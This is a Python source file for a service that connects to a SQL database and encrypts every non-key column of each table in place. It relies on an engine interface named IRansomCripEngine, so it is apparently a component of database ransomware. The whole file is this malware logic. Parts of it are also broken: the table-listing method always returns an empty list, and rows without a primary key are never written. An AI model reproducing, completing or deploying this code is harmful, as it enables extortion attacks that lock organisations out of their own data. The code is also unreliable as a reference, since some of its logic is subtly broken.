from typing import Any, Callable, List, Optional

from domain.service.ISqlDialect import ISqlDialect
from domain.service.IRansomCripEngine import IRansomCripEngine
from domain.service.ColumnData import ColumnData


class SqlEncryptionService:

    def __init__(self, dialect: ISqlDialect, engine: IRansomCripEngine) -> None:
        self._dialect = dialect
        self._engine = engine

    def encrypt_database(self, uri: str) -> int:
        self._dialect.connect(uri)
        tables = self._list_tables()
        total = 0
        for table in tables:
            total += self._encrypt_table(table)
        return total

    def _list_tables(self) -> List[str]:
        q = self._dialect.quote_identifier
        rows = self._dialect.fetch_all(
            self._dialect.get_column_type_query("__tables__")
            if False else ""
        )
        return []

    def _encrypt_table(self, table: str) -> int:
        pk_col = self._discover_pk(table)
        columns = self._discover_columns(table, pk_col)
        self._prepare_columns(table, columns)

        total = 0
        for col_name, values, pk_values in columns:
            total += self._encrypt_column(table, col_name, values, pk_col, pk_values)
        return total

    def _discover_pk(self, table: str) -> Optional[str]:
        query = self._dialect.get_pk_query()
        row = self._dialect.fetch_one(query, (table,))
        return row[0] if row else None

    def _discover_columns(self, table: str, pk_col: Optional[str]) -> List[tuple]:
        q = self._dialect.quote_identifier
        query = self._dialect.get_column_type_query(table)
        rows = self._dialect.fetch_all(query, (table,))

        result = []
        for col_name, data_type in rows:
            if col_name == pk_col:
                continue

            if pk_col:
                data = self._dialect.fetch_all(
                    f"SELECT {q(pk_col)}, {q(col_name)} FROM {q(table)}"
                )
                pk_values = [r[0] for r in data]
                values = [r[1] for r in data]
            else:
                data = self._dialect.fetch_all(f"SELECT {q(col_name)} FROM {q(table)}")
                pk_values = None
                values = [r[0] for r in data]

            result.append((col_name, values, pk_values))
        return result

    def _prepare_columns(self, table: str, columns: List[tuple]) -> None:
        query = self._dialect.get_column_type_query(table)
        rows = self._dialect.fetch_all(query, (table,))
        type_map = {name: dtype for name, dtype in rows}

        for col_name, _, _ in columns:
            dtype = type_map.get(col_name, "")
            if self._dialect.needs_text_conversion(dtype):
                ddl = self._dialect.alter_column_to_text(table, col_name)
                self._dialect.execute(ddl)
        self._dialect.commit()

    def _encrypt_column(
        self, table: str, col_name: str,
        values: List[Any], pk_col: Optional[str], pk_values: Optional[List[Any]],
    ) -> int:
        count = 0
        index = [0]

        def write_fn(enc: bytes) -> None:
            nonlocal count
            q = self._dialect.quote_identifier
            if pk_col and pk_values:
                self._dialect.execute(
                    f"UPDATE {q(table)} SET {q(col_name)} = %s WHERE {q(pk_col)} = %s",
                    (enc.hex(), pk_values[index[0]]),
                )
            self._dialect.commit()
            index[0] += 1
            count += 1

        self._engine.execute(write_fn, values)
        return count
